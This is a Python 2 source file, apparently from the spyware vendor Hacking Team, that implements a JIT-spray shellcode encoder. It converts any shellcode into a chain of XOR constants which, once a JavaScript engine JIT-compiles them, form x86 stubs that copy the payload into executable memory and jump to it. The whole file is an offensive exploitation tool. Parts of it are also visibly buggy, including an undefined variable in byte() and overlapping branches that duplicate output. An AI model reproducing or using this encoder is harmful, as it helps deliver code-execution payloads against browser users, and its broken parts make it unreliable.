#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

"""
jit encoders
Convert a shellcode into a sequence of xor operation according to Alexander Sintsov (Digital Security research Group) document
for JIT spray benefits...

"""

VERSION = "1.0"

NAME="jitencoder"
DESCRIPTION="jit spray encoder"
DOCUMENTATION={}
DOCUMENTATION["VENDOR"] = "HT srl"
DOCUMENTATION["Repeatability"] = "not applicable"
DOCUMENTATION["Author"] = "cod"
DOCUMENTATION["Notes"] = ""

import os
import sys

class jitencoder:

	"""
	ctor
	"""
	def __init__(self):
		return
		
	def byte(self, data):
		b0 = hex(b0).replace("0x", "")
		
		if len(b0) < 2:
			b0 = '0' + b0
		
		return b0

	def get2(self, shellcode, repeat, opt):
		value = ""
		
		for i in range(repeat):
			value = value + "0x22222222^"
			
		value = value + opt
		
		while (len(shellcode) % 4) != 0:
			shellcode = shellcode + '\xcc'
		
		i = 0
		
		value += "0x14ebc289^" + "0x14eb00b2^" + "0x14eb00b6^" + "0x14ebd189^" + "0x14ebf98b^" + "0x14ebc031^" + "0x14eb01b4^" + "0x14eb00b0^" + "0x14ebe0f7^" + "0x14ebf08b^" + "0x14ebdb33^" + "0x14eb04b3^"
			# 89 C2 MOV EDX, EAX	# address of rwx memory
			# b2 00 MOV DL, 0
			# b6 00 MOV DH, 0
			# 89 d1 mov ecx, edx	# ecx = destination
			# 8B CA mov edi, edx
			# 31 C0 xor eax, eax
			# b4 01 mov ah,  1
			# b4 00 mov al, 0
			# f7 e0 mul eax
			# 8b f0 mov esi, eax
			# 33 db xor ebx, ebx
			# b3 04 mov bl, 4
			
		#value += "0x14ebc031^0x14eb01b4^0x14eb00b0^0x14ebe0f7^0x14ebf0b8^0x14ebc031
		while (i < len(shellcode)):
			byte1 = shellcode[i+3]
			byte2 = shellcode[i+2]
			byte3 = shellcode[i+1]
			byte4 = shellcode[i+0]
			
			if (byte1 == 0 and byte2 == 0 and byte3 == 0 and byte4 == 0):
				value += "0x14ebc031^0x14eb0189^0x14ebcb03^"
					#xor eax, eax
					#mov [ecx], eax
					#add ecx, ebx
			if (byte3 == 0 and byte4 == 0):
				value += "0x14ebc031^" + "0x14eb%02xb4^0x14eb%02xb0^0x14ebe6f7^0x14eb0189^0x14ebcb03^" % (ord(byte1), ord(byte2))
					# xor eax, eax
					# mov ah, byte 1
					# mov al, byte 2
					# mul esi
					# mov [ecx], eax
					# add ecx, ebx
			if (byte1 == 0 and byte2 == 0):
				value += "0x14ebc031^" + "0x14eb%02xb4^0x14eb%02xb0^0x14eb0189^0x14ebcb03^" % (ord(byte3), ord(byte4))
					# xor eax, eax
					# mov ah, byte 3
					# mov al, byte 4
					# mov [ecx], eax
					# add ecx, ebx
			else:
				value += "0x14ebc031^" + "0x14eb%02xb4^0x14eb%02xb0^0x14ebe6f7^0x14eb%02xb4^0x14eb%02xb0^0x14eb0189^0x14ebcb03^" % (ord(byte1), ord(byte2), ord(byte3), ord(byte4))
					# xor eax, eax
					# mov ah, byte 1
					# mov al, byte 2
					# mul esi
					# mov ah, byte 3
					# mov al, byte 4
					# mov [ecx], eax
					# add ecx, ebx
				
			i = i + 4
		
		value += "0x14ebd189^" + " 0x14ebcf8b^" + "0x14ebe1ff" 
			# mov ecx, edx	# ecx = destination
			# mov ecx, edi
			# jmp ecx

		
		return value
	def get(self, shellcode):
		value = "0x22222222^0x22222222^0x22222222^0x22222222^0x22222222^0x22222222^0x22222222^0x22222222^"
		
		while (len(shellcode) % 4) != 0:
			shellcode = shellcode + '\xcc'
		
		i = 0
		
		value += "0x14ebc289^" + "0x14eb00b2^" + "0x14eb00b6^" + "0x14ebd189^" + "0x14ebf98b^" + "0x14ebc031^" + "0x14eb01b4^" + "0x14eb00b0^" + "0x14ebe0f7^" + "0x14ebf08b^" + "0x14ebdb33^" + "0x14eb04b3^"
			# 89 C2 MOV EDX, EAX	# address of rwx memory
			# b2 00 MOV DL, 0
			# b6 00 MOV DH, 0
			# 89 d1 mov ecx, edx	# ecx = destination
			# 8B CA mov edi, edx
			# 31 C0 xor eax, eax
			# b4 01 mov ah,  1
			# b4 00 mov al, 0
			# f7 e0 mul eax
			# 8b f0 mov esi, eax
			# 33 db xor ebx, ebx
			# b3 04 mov bl, 4
			
		#value += "0x14ebc031^0x14eb01b4^0x14eb00b0^0x14ebe0f7^0x14ebf0b8^0x14ebc031
		while (i < len(shellcode)):
			byte1 = shellcode[i+3]
			byte2 = shellcode[i+2]
			byte3 = shellcode[i+1]
			byte4 = shellcode[i+0]
			
			if (byte1 == 0 and byte2 == 0 and byte3 == 0 and byte4 == 0):
				value += "0x14ebc031^0x14eb0189^0x14ebcb03^"
					#xor eax, eax
					#mov [ecx], eax
					#add ecx, ebx
			if (byte3 == 0 and byte4 == 0):
				value += "0x14ebc031^" + "0x14eb%02xb4^0x14eb%02xb0^0x14ebe6f7^0x14eb0189^0x14ebcb03^" % (ord(byte1), ord(byte2))
					# xor eax, eax
					# mov ah, byte 1
					# mov al, byte 2
					# mul esi
					# mov [ecx], eax
					# add ecx, ebx
			if (byte1 == 0 and byte2 == 0):
				value += "0x14ebc031^" + "0x14eb%02xb4^0x14eb%02xb0^0x14eb0189^0x14ebcb03^" % (ord(byte3), ord(byte4))
					# xor eax, eax
					# mov ah, byte 3
					# mov al, byte 4
					# mov [ecx], eax
					# add ecx, ebx
			else:
				value += "0x14ebc031^" + "0x14eb%02xb4^0x14eb%02xb0^0x14ebe6f7^0x14eb%02xb4^0x14eb%02xb0^0x14eb0189^0x14ebcb03^" % (ord(byte1), ord(byte2), ord(byte3), ord(byte4))
					# xor eax, eax
					# mov ah, byte 1
					# mov al, byte 2
					# mul esi
					# mov ah, byte 3
					# mov al, byte 4
					# mov [ecx], eax
					# add ecx, ebx
				
			i = i + 4
		
		value += "0x14ebd189^" + " 0x14ebcf8b^" + "0x14ebe1ff" 
			# mov ecx, edx	# ecx = destination
			# mov ecx, edi
			# jmp ecx

		
		return value

if __name__ == "__main__":
	print "jscript/jitencoder"
	
	print "Getting input file"
	
	myclass = jitencoder()
	
	print "Opening file ", sys.argv[1]
	
	fd = open(sys.argv[1], "rb")
	
	array = fd.read()
	
	outdata = myclass.get(array)
	
	fd.close()
	#report
	fd = open(sys.argv[2], "wb")

	fd.write(outdata)
	fd.close()

	print "Transform completed"
